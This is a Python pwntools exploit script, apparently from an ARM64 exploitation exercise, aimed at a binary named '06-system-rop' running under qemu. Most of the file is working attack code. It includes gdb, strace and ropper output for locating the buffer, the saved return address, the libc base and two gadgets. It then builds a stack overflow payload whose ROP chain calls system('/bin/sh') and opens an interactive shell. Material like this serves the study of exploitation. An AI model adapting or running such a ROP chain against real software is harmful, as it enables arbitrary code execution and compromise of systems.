#!/usr/bin/python

"""
(gdb) disassemble main 
Dump of assembler code for function main:
   0x0000000000400678 <+0>:	stp	x29, x30, [sp, #-32]!
...
   0x0000000000400690 <+24>:	ldp	x29, x30, [sp], #32
   0x0000000000400694 <+28>:	ret
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x40063c: file src/06-system-rop.c, line 6.
(gdb) b *0x0000000000400690
Breakpoint 2 at 0x400690: file src/06-system-rop.c, line 17.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/06-system-rop.c:6
6		printf("> ");
(gdb) p &buffer[0]
$1 = 0x40007ffd80 ""
(gdb) c
Continuing.

Breakpoint 2, main (argc=1, argv=0x40007fff58) at src/06-system-rop.c:17
17	}
(gdb) i r $sp
sp             0x40007ffe00	0x40007ffe00
"""

"""
$ qemu-aarch64 -L /usr/aarch64-linux-gnu/ -strace ./bin/arm64/06-system-rop
...
24334 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
24334 mmap(NULL,1413976,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x0000004000852000
...
"""

"""
$ ropper --nocolor --file /usr/aarch64-linux-gnu/lib/libc-2.27.so
0x00036edc: ldp x24, x25, [sp, #0x38]; ldp x29, x30, [sp], #0x50; ret;
0x000ce2ec: mov x0, x24; blr x25;
"""

import struct
import sys

from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/06-system-rop'
libc_path = '/usr/aarch64-linux-gnu/lib/libc-2.27.so'

saved_x30_addr = 0x40007ffe00 + 8
buffer_addr = 0x40007ffd80
libc_addr = 0x0000004000852000

ldp_x24_x25_x30_ret_addr = libc_addr + 0x00036edc
mov_x0_x24_blr_x25_addr = libc_addr + 0x000ce2ec

libc = ELF(libc_path)
system_addr = libc_addr + libc.symbols['system']
bin_sh_addr = libc_addr + libc.search('/bin/sh\x00').next()

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_x30_addr - buffer_addr)
payload += p64(ldp_x24_x25_x30_ret_addr)
payload += 'b' * 16
payload += p64(0) # x29
payload += p64(mov_x0_x24_blr_x25_addr) # x30
payload += 'c' * (0x38 - 16)
payload += p64(bin_sh_addr) # x24
payload += p64(system_addr) # x25

p.readuntil('> ')
p.write(payload)
p.interactive()
